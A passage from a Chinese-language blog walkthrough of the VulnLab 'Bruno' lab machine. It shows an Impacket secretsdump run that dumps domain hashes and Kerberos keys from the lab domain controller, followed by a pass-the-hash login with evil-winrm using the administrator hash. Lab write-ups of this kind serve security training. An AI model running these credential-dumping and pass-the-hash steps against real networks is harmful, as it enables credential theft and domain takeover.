class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">[mane] $ secretsdump.py bruno.vl/administrator@brunodc.bruno.vl -k -no-pass</span><br><span class="line">Impacket v0.13.0.dev0+20250109.91705.ac02e0e - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d</span><br><span class="line">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:850e9b2af4245da7880c3e57b3bd0dee:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC</span><br><span class="line">BRUNO\BRUNODC$:plain_password_hex:635712e1cd7f853df43832f927de4e260d125ef4960f49e6a1e30f58ca2682ad9308d575bcb7a3ca29277a13a913afbde619037b5d25a8dd972d763a9efb71d96149197e0659b4548c8e879b4308820258fbe938e4f05e06b1e02323daf24234ae1dbf2b5c8e443413759884c92e523458beacc8eaa5f35ad606ef8ba222b1b7d490c1b099db7eecc8f43a2dc65b96bc9b3545295ebd9db41f86034ae9f49064620e0d4e20ae99c490acd00fa49c7799d4655531688609f4a65e20518bf3cf6f3df04dcb1d82f36accb2cb4621b14efba6c5cba5529ba9c2f3b990e4360eba2507b3a2f2fe7808a88acfd5ac6f8a1dc4</span><br><span class="line">BRUNO\BRUNODC$:aad3b435b51404eeaad3b435b51404ee:33e0ed1a708c69b79c429249bf43f288:::</span><br><span class="line">[*] DPAPI_SYSTEM</span><br><span class="line">dpapi_machinekey:0xf8d4d8c4889a8f43fab85af516c74b4777c4a36f</span><br><span class="line">dpapi_userkey:0x22703d188aa05d0d7c08bd078df5949eb70e6180</span><br><span class="line">[*] NL$KM</span><br><span class="line"> 0000   B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44   ...~.....9....$D</span><br><span class="line"> 0010   A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72   ..M..YF........r</span><br><span class="line"> 0020   EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5   ..Z...&amp;.m.......</span><br><span class="line"> 0030   96 CD E5 3F A0 06 5E C1  A5 01 A1 CE 8C 24 76 95   ...?..^......$v.</span><br><span class="line">NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:13735c7d60b417421dc6130ac3e0bfd4:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:926afc778f7a1406b77513d875520c6f:::</span><br><span class="line">bruno.vl\svc_net:1103:aad3b435b51404eeaad3b435b51404ee:c4f34b79030a4329c7929a71c79baf38:::</span><br><span class="line">bruno.vl\svc_scan:1104:aad3b435b51404eeaad3b435b51404ee:c4f34b79030a4329c7929a71c79baf38:::</span><br><span class="line">bruno.vl\Chloe.Ball:1106:aad3b435b51404eeaad3b435b51404ee:4efe75a82ece893bd878ca66c04e1cc5:::</span><br><span class="line">bruno.vl\Kayleigh.Patel:1107:aad3b435b51404eeaad3b435b51404ee:821550a6d75171382849d63e3c12dad1:::</span><br><span class="line">bruno.vl\Donna.Harrison:1108:aad3b435b51404eeaad3b435b51404ee:120ca8e1b8d4fecc5d7417b638f30d0c:::</span><br><span class="line">bruno.vl\Charles.Young:1109:aad3b435b51404eeaad3b435b51404ee:3d50f4c837cef7cf5143767553b6cc19:::</span><br><span class="line">bruno.vl\Graeme.Grant:1110:aad3b435b51404eeaad3b435b51404ee:e5b5bc6a01fd48adc0f67a71629b5c19:::</span><br><span class="line">bruno.vl\Natalie.Anderson:1111:aad3b435b51404eeaad3b435b51404ee:880c8cb0afc411db5d4b8a3159577d44:::</span><br><span class="line">bruno.vl\Sam.Owen:1112:aad3b435b51404eeaad3b435b51404ee:830681ca97d7f828f939e5f9cdfed754:::</span><br><span class="line">bruno.vl\Jeremy.Singh:1113:aad3b435b51404eeaad3b435b51404ee:8b1263356938ce9d149f3518e67b9959:::</span><br><span class="line">bruno.vl\Kieran.Day:1114:aad3b435b51404eeaad3b435b51404ee:2f80b61c70a348160f4632cef9a6215b:::</span><br><span class="line">bruno.vl\Hugh.Young:1115:aad3b435b51404eeaad3b435b51404ee:78eef081a8838baca1f2f547ce6f935a:::</span><br><span class="line">BRUNODC$:1000:aad3b435b51404eeaad3b435b51404ee:33e0ed1a708c69b79c429249bf43f288:::</span><br><span class="line">manepc$:1116:aad3b435b51404eeaad3b435b51404ee:89551acff8895768e489bb3054af94fd:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:8366d22e99c4e2f9b5c9a8bbf5b1b9ea6fd097f622048a3fdb29e95ca69d686f</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:882ed3f25c43d2e0519951e837a885d3</span><br><span class="line">Administrator:des-cbc-md5:3e16a497806115b3</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:3b081440c5131b441555f59f7613e2f9ec83ff07c5036bd973f084b14dbe8e46</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:b6d4be2ff14de3b0a557b9f40a563c59</span><br><span class="line">krbtgt:des-cbc-md5:02c8e92313912638</span><br><span class="line">bruno.vl\svc_net:aes256-cts-hmac-sha1-96:cafb9b5775dea822bdb66248e61cf09d003ac8b553ab2d85793f6ea00ea15b91</span><br><span class="line">bruno.vl\svc_net:aes128-cts-hmac-sha1-96:749f1f62dfec1b66a4bcf60a07f6a465</span><br><span class="line">bruno.vl\svc_net:des-cbc-md5:2cfef2a8b57cd907</span><br><span class="line">bruno.vl\svc_scan:aes256-cts-hmac-sha1-96:82e976d9e83a3cfb4a4b5f51567d930ffd1c9c25e76faa1ea137108421ca4426</span><br><span class="line">bruno.vl\svc_scan:aes128-cts-hmac-sha1-96:4e5c05a594239a1516e4a3f59ebf6a13</span><br><span class="line">bruno.vl\svc_scan:des-cbc-md5:46ec4f92a879d61f</span><br><span class="line">bruno.vl\Chloe.Ball:aes256-cts-hmac-sha1-96:47864e8404b82923f404de8ccbf3676dd4793ba12ae85b110d0024b9132f6568</span><br><span class="line">bruno.vl\Chloe.Ball:aes128-cts-hmac-sha1-96:657d98a2af99bc16a1536c5eccb19ae2</span><br><span class="line">bruno.vl\Chloe.Ball:des-cbc-md5:31a2df8ac2f1bf45</span><br><span class="line">bruno.vl\Kayleigh.Patel:aes256-cts-hmac-sha1-96:daf846bbd582cb30d29e5ed2e94ffaf0395c23189f92a3b8c12fc96fbee52314</span><br><span class="line">bruno.vl\Kayleigh.Patel:aes128-cts-hmac-sha1-96:14b06cf39227e426b70ba14442dee40f</span><br><span class="line">bruno.vl\Kayleigh.Patel:des-cbc-md5:1032c4012fd5ae19</span><br><span class="line">bruno.vl\Donna.Harrison:aes256-cts-hmac-sha1-96:144cc36b3f8ef377d047404029a12368456eb09c7b2eec6441024d464af6a024</span><br><span class="line">bruno.vl\Donna.Harrison:aes128-cts-hmac-sha1-96:1770287318457adf814de9048c465c7c</span><br><span class="line">bruno.vl\Donna.Harrison:des-cbc-md5:4c7c855b29a151d3</span><br><span class="line">bruno.vl\Charles.Young:aes256-cts-hmac-sha1-96:317b168352e1221177206391b1a1bc0711650439ca62a09803c15e5fefc7ee6e</span><br><span class="line">bruno.vl\Charles.Young:aes128-cts-hmac-sha1-96:924ebf2f4964cd171dcff85d2da3329a</span><br><span class="line">bruno.vl\Charles.Young:des-cbc-md5:585720310807e5b0</span><br><span class="line">bruno.vl\Graeme.Grant:aes256-cts-hmac-sha1-96:1224cadd3186dfe32b13cf92bd399fc6b8ebd82ae1fc070f2195fdf8c501fbd0</span><br><span class="line">bruno.vl\Graeme.Grant:aes128-cts-hmac-sha1-96:388fde76a02042631fa10b9f32b2c4c9</span><br><span class="line">bruno.vl\Graeme.Grant:des-cbc-md5:cb6d7615a19892c8</span><br><span class="line">bruno.vl\Natalie.Anderson:aes256-cts-hmac-sha1-96:b34fffd92671bba884152777617193cc95a971f63cb38b2bb7dc51a3af0e6bd2</span><br><span class="line">bruno.vl\Natalie.Anderson:aes128-cts-hmac-sha1-96:50454fdeb8dd28d3419a124971173706</span><br><span class="line">bruno.vl\Natalie.Anderson:des-cbc-md5:2085d92cbcbf0d1c</span><br><span class="line">bruno.vl\Sam.Owen:aes256-cts-hmac-sha1-96:b3b51369f137312db8e6069f966c77f76008a32d8d495f16f57fac56e76f10f7</span><br><span class="line">bruno.vl\Sam.Owen:aes128-cts-hmac-sha1-96:0f4fb13e3e763b05d95ac0158cd293eb</span><br><span class="line">bruno.vl\Sam.Owen:des-cbc-md5:d349daefc10dea37</span><br><span class="line">bruno.vl\Jeremy.Singh:aes256-cts-hmac-sha1-96:465a4605922f10445fcfd767775fc59997a63bb6dffcbe6886e8e70a969febc1</span><br><span class="line">bruno.vl\Jeremy.Singh:aes128-cts-hmac-sha1-96:e80e467d2c52415a45365a55fababc47</span><br><span class="line">bruno.vl\Jeremy.Singh:des-cbc-md5:fef23ba22cbcb62f</span><br><span class="line">bruno.vl\Kieran.Day:aes256-cts-hmac-sha1-96:98914ef5df0e8a39eb953a9bbe286dd6861d4e7822311e182be4efcf299872de</span><br><span class="line">bruno.vl\Kieran.Day:aes128-cts-hmac-sha1-96:4c472b9aa96f99c5f35b26ff2ffcaf03</span><br><span class="line">bruno.vl\Kieran.Day:des-cbc-md5:0bd0c752929d5210</span><br><span class="line">bruno.vl\Hugh.Young:aes256-cts-hmac-sha1-96:be216166da5744799c4d1ad6cf67c1b20aa9a0e4f08bd3f98fcc7ea4fff7e120</span><br><span class="line">bruno.vl\Hugh.Young:aes128-cts-hmac-sha1-96:b40a015e3eff27964ef88f703bf9568e</span><br><span class="line">bruno.vl\Hugh.Young:des-cbc-md5:bcf4da80341c19a7</span><br><span class="line">BRUNODC$:aes256-cts-hmac-sha1-96:6a3deb683183a539c5dd77b8536a998c86e5e904a140864f32ebaa16f923b4da</span><br><span class="line">BRUNODC$:aes128-cts-hmac-sha1-96:8da97d66c707a71cb7b21e2f47f959af</span><br><span class="line">BRUNODC$:des-cbc-md5:6bfdd504855d1307</span><br><span class="line">manepc$:aes256-cts-hmac-sha1-96:fff314efcffe40f200c99aa3104d5f3ca620a559fe0a8d87b22cf742aa8b0450</span><br><span class="line">manepc$:aes128-cts-hmac-sha1-96:e863783de33543f8f2b6009ce9376a73</span><br><span class="line">manepc$:des-cbc-md5:d58cdc790de9c129</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+<p>拿到了hash接下來就是Pass the admin hash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.10.101.5 -u &#x27;administrator&#x27; -H &quot;13735c7d60b417421dc6130ac3e0bfd4&quot;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118121328-x7hws0b.png" alt="image">​</p>
+<p>另外如果你看防火墻，就可以看到有一個條規則是關於 10246 端口的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS &gt; Get-NetFirewallRule</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/16-vulnlab-Bruno/image-20250118174331-7vrit8k.png" alt="image">​</p>
+<p>‍</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&text=VulnLab - Machine - Bruno"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&title=VulnLab - Machine - Bruno"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&is_video=false&description=VulnLab - Machine - Bruno"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Bruno&body=Check out this article: https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&title=VulnLab - Machine - Bruno"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&title=VulnLab - Machine - Bruno"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&title=VulnLab - Machine - Bruno"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&title=VulnLab - Machine - Bruno"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&name=VulnLab - Machine - Bruno&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/18/2025/16-vulnlab-Bruno/&t=VulnLab - Machine - Bruno"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
